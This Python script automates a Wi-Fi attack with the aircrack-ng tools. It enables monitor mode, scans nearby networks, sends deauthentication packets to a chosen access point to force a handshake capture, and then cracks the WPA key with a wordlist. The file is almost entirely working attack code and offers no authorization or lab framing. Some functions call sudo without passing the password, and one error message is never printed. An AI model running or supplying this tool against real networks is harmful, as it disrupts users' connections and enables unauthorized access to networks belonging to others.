import subprocess
import time
import csv
import glob
import os

def get_password():
    while True:
        pw = input("type admin pw to begin: ")
        pw_check = input("retype admin pw to verify: ")
        if pw == pw_check:
            return pw
        else:
            "Please try again. Ensure the passwords match."
            continue

def start_monitor(password):
    start1 = ["sudo", "-S", "airmon-ng", "check", "kill"]
    start2 = ["sudo", "-S", "airmon-ng", "start", "wlan0"]
    process = subprocess.run(start1, input=password + "\n", capture_output=True, text=True)
    process2 = subprocess.run(start2, input=password + "\n", capture_output=True, text=True)
    print(process.stdout)
    print(process2.stdout)

def recon_scan(password, interface="wlan0mon", duration=30):
    start1 = ["sudo", "-S", "timeout", str(duration), "airodump-ng", "--write", "scan_results",
              "--output-format", "csv", interface]
    process = subprocess.Popen(start1, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    process.stdin.write(password + "\n")
    process.stdin.flush()
    time.sleep(31)
    files = glob.glob("scan_results-*.csv")
    filename = max(files, key=os.path.getctime)
    print(f"Now displaying {filename}:")
    with open(filename) as f:
        reader = csv.reader(f)
        for row in reader:
            if not row:
                continue
            if row[0].startswith("BSSID"):
                continue
            if row[0].startswith("Station MAC"):
                break
            bssid = row[0]
            channel = row[3]
            security = row[5]
            ssid = row[13]
            print(f"{bssid}, {channel}, {security}, {ssid}")

def capture_n_deauth(network, channel=11, interface="wlan0mon"):
    start1 = ["sudo", "-S", "timeout", "100", "airodump-ng", "--channel", str(channel), "-w", "capture", interface]
    proc1 = subprocess.Popen(start1, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True)
    print(f"Now targeting {network} on channel {channel}")
    time.sleep(3)
    print("Sending packets...")
    start2 = ["sudo", "-S", "aireplay-ng", "--deauth", "70", "-a", network, interface]
    proc2 = subprocess.run(start2, capture_output=True, text=True)
    time.sleep(10)
    files = glob.glob("capture-*.cap")
    filename = max(files, key=os.path.getctime)
    print(filename)
    start3 = ["sudo", "-S", "aircrack-ng", "-b", network, filename]
    proc3 = subprocess.run(start3, capture_output=True, text=True)
    print(proc3.stdout)

def attempt_crack(target, wordlist):
    files = glob.glob("capture-*.cap")
    filename = max(files, key=os.path.getctime)
    start1 = ["sudo", "-S", "aircrack-ng", "-w", wordlist, "-b", target, filename]
    proc1 = subprocess.run(start1, capture_output=True, text=True)
    print(proc1.stdout)

def end_monitor(password):
    start1 = ["sudo", "-S", "airmon-ng", "stop", "wlan0mon"]
    start2 = ["sudo", "-S", "systemctl", "restart", "NetworkManager"]
    process = subprocess.run(start1, input=password + "\n", capture_output=True, text=True)
    process2 = subprocess.run(start2, input=password + "\n", capture_output=True, text=True)
    print(process.stdout)